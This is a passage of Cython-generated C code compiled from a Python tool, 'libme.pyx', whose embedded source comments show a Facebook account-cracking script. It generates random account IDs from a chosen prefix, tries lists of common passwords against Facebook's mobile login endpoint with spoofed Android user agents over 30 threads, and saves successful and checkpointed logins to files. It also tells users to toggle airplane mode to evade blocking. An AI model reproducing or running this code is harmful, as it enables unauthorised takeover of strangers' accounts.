      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      /* "libme.pyx":205
 * 				self.cp.append("%s|%s"%(uid, pw))
 * 				open("CP/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break             # <<<<<<<<<<<<<<
 * 			else:
 * 				continue
 */
      goto __pyx_L4_break;

      /* "libme.pyx":201
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break
 * 			elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:             # <<<<<<<<<<<<<<
 * 				print("\r  \033[0;91m ~> %s|%s\033[0;97m         "%(uid, pw))
 * 				self.cp.append("%s|%s"%(uid, pw))
 */
    }

    /* "libme.pyx":207
 * 				break
 * 			else:
 * 				continue             # <<<<<<<<<<<<<<
 * 		self.loop +=1
 * 	def __fb4__(self):
 */
    /*else*/ {
      goto __pyx_L3_continue;
    }

    /* "libme.pyx":192
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
 * 		); sys.stdout.flush()
 * 		for pw in pwx:             # <<<<<<<<<<<<<<
 * 			pw= pw.lower()
 * 			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
 */
    __pyx_L3_continue:;
  }
  __pyx_L4_break:;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":208
 * 			else:
 * 				continue
 * 		self.loop +=1             # <<<<<<<<<<<<<<
 * 	def __fb4__(self):
 * 		x = 1111
 */
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_loop); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 208, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_6 = __Pyx_PyInt_AddObjC(__pyx_t_1, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 208, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_loop, __pyx_t_6) < 0) __PYX_ERR(0, 208, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  /* "libme.pyx":175
 * 			exit(str(e))
 * 
 * 	def __api__(self, uid, pwx):             # <<<<<<<<<<<<<<
 * 		ua = random.choice([
 * 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_AddTraceback("libme.James.__api__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_ua);
  __Pyx_XDECREF(__pyx_v_url);
  __Pyx_XDECREF(__pyx_v_pw);
  __Pyx_XDECREF(__pyx_v_rex);
  __Pyx_XDECREF(__pyx_v_xo);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":209
 * 				continue
 * 		self.loop +=1
 * 	def __fb4__(self):             # <<<<<<<<<<<<<<
 * 		x = 1111
 * 		xx = 9999
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_11__fb4__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_11__fb4__ = {"__fb4__", (PyCFunction)__pyx_pw_5libme_5James_11__fb4__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_11__fb4__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__fb4__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_10__fb4__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_10__fb4__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  long __pyx_v_x;
  long __pyx_v_xx;
  PyObject *__pyx_v_idx = NULL;
  PyObject *__pyx_v_limit = NULL;
  PyObject *__pyx_v_i = NULL;
  PyObject *__pyx_v_ib = NULL;
  PyObject *__pyx_v_coeg = NULL;
  PyObject *__pyx_v_listpass = NULL;
  PyObject *__pyx_v_user = NULL;
  PyObject *__pyx_v_e = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  Py_ssize_t __pyx_t_6;
  PyObject *(*__pyx_t_7)(PyObject *);
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  int __pyx_t_12;
  PyObject *__pyx_t_13 = NULL;
  int __pyx_t_14;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  int __pyx_t_19;
  PyObject *__pyx_t_20 = NULL;
  int __pyx_t_21;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__fb4__", 0);

  /* "libme.pyx":210
 * 		self.loop +=1
 * 	def __fb4__(self):
 * 		x = 1111             # <<<<<<<<<<<<<<
 * 		xx = 9999
 * 		idx = input("  \033[0;92m[!] Choose Code 200,201,202,203,205,209,250 : ")
 */
  __pyx_v_x = 0x457;

  /* "libme.pyx":211
 * 	def __fb4__(self):
 * 		x = 1111
 * 		xx = 9999             # <<<<<<<<<<<<<<
 * 		idx = input("  \033[0;92m[!] Choose Code 200,201,202,203,205,209,250 : ")
 * 		limit = int(input("  [!] Enter the number of IDs : "))
 */
  __pyx_v_xx = 0x270F;

  /* "libme.pyx":212
 * 		x = 1111
 * 		xx = 9999
 * 		idx = input("  \033[0;92m[!] Choose Code 200,201,202,203,205,209,250 : ")             # <<<<<<<<<<<<<<
 * 		limit = int(input("  [!] Enter the number of IDs : "))
 * 		try:
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__16, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 212, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_idx = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "libme.pyx":213
 * 		xx = 9999
 * 		idx = input("  \033[0;92m[!] Choose Code 200,201,202,203,205,209,250 : ")
 * 		limit = int(input("  [!] Enter the number of IDs : "))             # <<<<<<<<<<<<<<
 * 		try:
 * 			for i in range(limit):
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__17, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 213, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyNumber_Int(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 213, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_limit = __pyx_t_2;
  __pyx_t_2 = 0;

  /* "libme.pyx":214
 * 		idx = input("  \033[0;92m[!] Choose Code 200,201,202,203,205,209,250 : ")
 * 		limit = int(input("  [!] Enter the number of IDs : "))
 * 		try:             # <<<<<<<<<<<<<<
 * 			for i in range(limit):
 * 				i = random.randint(x,xx)
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_3, &__pyx_t_4, &__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_5);
    /*try:*/ {

      /* "libme.pyx":215
 * 		limit = int(input("  [!] Enter the number of IDs : "))
 * 		try:
 * 			for i in range(limit):             # <<<<<<<<<<<<<<
 * 				i = random.randint(x,xx)
 * 				ib = idx
 */
      __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_v_limit); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 215, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      if (likely(PyList_CheckExact(__pyx_t_2)) || PyTuple_CheckExact(__pyx_t_2)) {
        __pyx_t_1 = __pyx_t_2; __Pyx_INCREF(__pyx_t_1); __pyx_t_6 = 0;
        __pyx_t_7 = NULL;
      } else {
        __pyx_t_6 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 215, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_7 = Py_TYPE(__pyx_t_1)->tp_iternext; if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 215, __pyx_L3_error)
      }
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      for (;;) {
        if (likely(!__pyx_t_7)) {
          if (likely(PyList_CheckExact(__pyx_t_1))) {
            if (__pyx_t_6 >= PyList_GET_SIZE(__pyx_t_1)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_2 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_6); __Pyx_INCREF(__pyx_t_2); __pyx_t_6++; if (unlikely(0 < 0)) __PYX_ERR(0, 215, __pyx_L3_error)
            #else
            __pyx_t_2 = PySequence_ITEM(__pyx_t_1, __pyx_t_6); __pyx_t_6++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 215, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_2);
            #endif
          } else {
            if (__pyx_t_6 >= PyTuple_GET_SIZE(__pyx_t_1)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_2 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_6); __Pyx_INCREF(__pyx_t_2); __pyx_t_6++; if (unlikely(0 < 0)) __PYX_ERR(0, 215, __pyx_L3_error)
            #else
            __pyx_t_2 = PySequence_ITEM(__pyx_t_1, __pyx_t_6); __pyx_t_6++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 215, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_2);
            #endif
          }
        } else {
          __pyx_t_2 = __pyx_t_7(__pyx_t_1);
          if (unlikely(!__pyx_t_2)) {
            PyObject* exc_type = PyErr_Occurred();
            if (exc_type) {
              if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
              else __PYX_ERR(0, 215, __pyx_L3_error)
            }
            break;
          }
          __Pyx_GOTREF(__pyx_t_2);
        }
        __Pyx_XDECREF_SET(__pyx_v_i, __pyx_t_2);
        __pyx_t_2 = 0;

        /* "libme.pyx":216
 * 		try:
 * 			for i in range(limit):
 * 				i = random.randint(x,xx)             # <<<<<<<<<<<<<<
 * 				ib = idx
 * 				self.id.append(ib+str(i))
 */
        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_random); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 216, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_randint); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 216, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = __Pyx_PyInt_From_long(__pyx_v_x); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 216, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_10 = __Pyx_PyInt_From_long(__pyx_v_xx); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 216, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        __pyx_t_11 = NULL;
        __pyx_t_12 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
          __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_9);
          if (likely(__pyx_t_11)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_11);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
            __pyx_t_12 = 1;
          }
        }
        #if CYTHON_FAST_PYCALL
        if (PyFunction_Check(__pyx_t_9)) {
          PyObject *__pyx_temp[3] = {__pyx_t_11, __pyx_t_8, __pyx_t_10};
          __pyx_t_2 = __Pyx_PyFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_12, 2+__pyx_t_12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 216, __pyx_L3_error)
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        } else
        #endif
        #if CYTHON_FAST_PYCCALL
        if (__Pyx_PyFastCFunction_Check(__pyx_t_9)) {
          PyObject *__pyx_temp[3] = {__pyx_t_11, __pyx_t_8, __pyx_t_10};
          __pyx_t_2 = __Pyx_PyCFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_12, 2+__pyx_t_12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 216, __pyx_L3_error)
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        } else
        #endif
        {
          __pyx_t_13 = PyTuple_New(2+__pyx_t_12); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 216, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_13);
          if (__pyx_t_11) {
            __Pyx_GIVEREF(__pyx_t_11); PyTuple_SET_ITEM(__pyx_t_13, 0, __pyx_t_11); __pyx_t_11 = NULL;
          }
          __Pyx_GIVEREF(__pyx_t_8);
          PyTuple_SET_ITEM(__pyx_t_13, 0+__pyx_t_12, __pyx_t_8);
          __Pyx_GIVEREF(__pyx_t_10);
          PyTuple_SET_ITEM(__pyx_t_13, 1+__pyx_t_12, __pyx_t_10);
          __pyx_t_8 = 0;
          __pyx_t_10 = 0;
          __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_t_13, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 216, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        }
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __Pyx_DECREF_SET(__pyx_v_i, __pyx_t_2);
        __pyx_t_2 = 0;

        /* "libme.pyx":217
 * 			for i in range(limit):
 * 				i = random.randint(x,xx)
 * 				ib = idx             # <<<<<<<<<<<<<<
 * 				self.id.append(ib+str(i))
 * 			print("  [] Total id > \033[0;91m(%s)\033[0;97m"%(len(self.id)))
 */
        __Pyx_INCREF(__pyx_v_idx);
        __Pyx_XDECREF_SET(__pyx_v_ib, __pyx_v_idx);

        /* "libme.pyx":218
 * 				i = random.randint(x,xx)
 * 				ib = idx
 * 				self.id.append(ib+str(i))             # <<<<<<<<<<<<<<
 * 			print("  [] Total id > \033[0;91m(%s)\033[0;97m"%(len(self.id)))
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 */
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 218, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_9 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_i); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 218, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_13 = PyNumber_Add(__pyx_v_ib, __pyx_t_9); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 218, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_13);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_14 = __Pyx_PyObject_Append(__pyx_t_2, __pyx_t_13); if (unlikely(__pyx_t_14 == ((int)-1))) __PYX_ERR(0, 218, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

        /* "libme.pyx":215
 * 		limit = int(input("  [!] Enter the number of IDs : "))
 * 		try:
 * 			for i in range(limit):             # <<<<<<<<<<<<<<
 * 				i = random.randint(x,xx)
 * 				ib = idx
 */
      }
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      /* "libme.pyx":219
 * 				ib = idx
 * 				self.id.append(ib+str(i))
 * 			print("  [] Total id > \033[0;91m(%s)\033[0;97m"%(len(self.id)))             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For Example Separators : 123456,123456789")
 */
      __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 219, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_6 = PyObject_Length(__pyx_t_1); if (unlikely(__pyx_t_6 == ((Py_ssize_t)-1))) __PYX_ERR(0, 219, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = PyInt_FromSsize_t(__pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 219, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_13 = __Pyx_PyString_Format(__pyx_kp_s_Total_id_0_91m_s_0_97m, __pyx_t_1); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 219, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_13);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      if (__Pyx_PrintOne(0, __pyx_t_13) < 0) __PYX_ERR(0, 219, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

      /* "libme.pyx":220
 * 				self.id.append(ib+str(i))
 * 			print("  [] Total id > \033[0;91m(%s)\033[0;97m"%(len(self.id)))
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[*] For Example Separators : 123456,123456789")
 * 				listpass = input("  [+] Enter password : ")
 */
      /*with:*/ {
        __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 220, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_13);
        __pyx_t_1 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 220, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 220, __pyx_L3_error)
        __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_13, __pyx_empty_tuple, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 220, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_15 = __Pyx_PyObject_LookupSpecial(__pyx_t_2, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 220, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_15);
        __pyx_t_13 = __Pyx_PyObject_LookupSpecial(__pyx_t_2, __pyx_n_s_enter); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 220, __pyx_L11_error)
        __Pyx_GOTREF(__pyx_t_13);
        __pyx_t_9 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_13))) {
          __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_13);
          if (likely(__pyx_t_9)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
            __Pyx_INCREF(__pyx_t_9);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_13, function);
          }
        }
        __pyx_t_1 = (__pyx_t_9) ? __Pyx_PyObject_CallOneArg(__pyx_t_13, __pyx_t_9) : __Pyx_PyObject_CallNoArg(__pyx_t_13);
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 220, __pyx_L11_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        __pyx_t_13 = __pyx_t_1;
        __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        /*try:*/ {
          {
            __Pyx_PyThreadState_declare
            __Pyx_PyThreadState_assign
            __Pyx_ExceptionSave(&__pyx_t_16, &__pyx_t_17, &__pyx_t_18);
            __Pyx_XGOTREF(__pyx_t_16);
            __Pyx_XGOTREF(__pyx_t_17);
            __Pyx_XGOTREF(__pyx_t_18);
            /*try:*/ {
              __pyx_v_coeg = __pyx_t_13;
              __pyx_t_13 = 0;

              /* "libme.pyx":221
 * 			print("  [] Total id > \033[0;91m(%s)\033[0;97m"%(len(self.id)))
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For Example Separators : 123456,123456789")             # <<<<<<<<<<<<<<
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:
 */
              if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_For_Example_Separators_12) < 0) __PYX_ERR(0, 221, __pyx_L15_error)

              /* "libme.pyx":222
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For Example Separators : 123456,123456789")
 * 				listpass = input("  [+] Enter password : ")             # <<<<<<<<<<<<<<
 * 				if len(listpass)<=5:
 * 					exit("\n  [!]  Password Minimum 6 Characters")
 */
              __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__10, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 222, __pyx_L15_error)
              __Pyx_GOTREF(__pyx_t_13);
              __pyx_v_listpass = __pyx_t_13;
              __pyx_t_13 = 0;

              /* "libme.pyx":223
 * 				print("\n  \033[0;97m[*] For Example Separators : 123456,123456789")
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:             # <<<<<<<<<<<<<<
 * 					exit("\n  [!]  Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 */
              __pyx_t_6 = PyObject_Length(__pyx_v_listpass); if (unlikely(__pyx_t_6 == ((Py_ssize_t)-1))) __PYX_ERR(0, 223, __pyx_L15_error)
              __pyx_t_19 = ((__pyx_t_6 <= 5) != 0);
              if (__pyx_t_19) {

                /* "libme.pyx":224
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:
 * 					exit("\n  [!]  Password Minimum 6 Characters")             # <<<<<<<<<<<<<<
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
                __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__18, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 224, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_13);
                __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

                /* "libme.pyx":223
 * 				print("\n  \033[0;97m[*] For Example Separators : 123456,123456789")
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:             # <<<<<<<<<<<<<<
 * 					exit("\n  [!]  Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 */
              }

              /* "libme.pyx":225
 * 				if len(listpass)<=5:
 * 					exit("\n  [!]  Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")
 */
              __pyx_t_13 = __Pyx_PyString_FormatSafe(__pyx_kp_s_0_97m_Crack_with_password_0_91m, __pyx_v_listpass); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 225, __pyx_L15_error)
              __Pyx_GOTREF(__pyx_t_13);
              if (__Pyx_PrintOne(0, __pyx_t_13) < 0) __PYX_ERR(0, 225, __pyx_L15_error)
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

              /* "libme.pyx":226
 * 					exit("\n  [!]  Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")             # <<<<<<<<<<<<<<
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 */
              if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_Ok_result_saved_in_ok_txt) < 0) __PYX_ERR(0, 226, __pyx_L15_error)

              /* "libme.pyx":227
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")             # <<<<<<<<<<<<<<
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:
 */
              if (__Pyx_PrintOne(0, __pyx_kp_s_Cp_result_saved_in_cp_txt) < 0) __PYX_ERR(0, 227, __pyx_L15_error)

              /* "libme.pyx":228
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")             # <<<<<<<<<<<<<<
 * 				for user in self.id:
 * 					coeg.submit(self.__apii__, user, listpass.split(","))
 */
              if (__Pyx_PrintOne(0, __pyx_kp_s_If_No_Result_Turn_On_Airplane_M) < 0) __PYX_ERR(0, 228, __pyx_L15_error)

              /* "libme.pyx":229
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:             # <<<<<<<<<<<<<<
 * 					coeg.submit(self.__apii__, user, listpass.split(","))
 * 			exit("\n\n [] Cracking finished...")
 */
              __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 229, __pyx_L15_error)
              __Pyx_GOTREF(__pyx_t_13);
              if (likely(PyList_CheckExact(__pyx_t_13)) || PyTuple_CheckExact(__pyx_t_13)) {
                __pyx_t_2 = __pyx_t_13; __Pyx_INCREF(__pyx_t_2); __pyx_t_6 = 0;
                __pyx_t_7 = NULL;
              } else {
                __pyx_t_6 = -1; __pyx_t_2 = PyObject_GetIter(__pyx_t_13); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 229, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_2);
                __pyx_t_7 = Py_TYPE(__pyx_t_2)->tp_iternext; if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 229, __pyx_L15_error)
              }
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
              for (;;) {
                if (likely(!__pyx_t_7)) {
                  if (likely(PyList_CheckExact(__pyx_t_2))) {
                    if (__pyx_t_6 >= PyList_GET_SIZE(__pyx_t_2)) break;
                    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
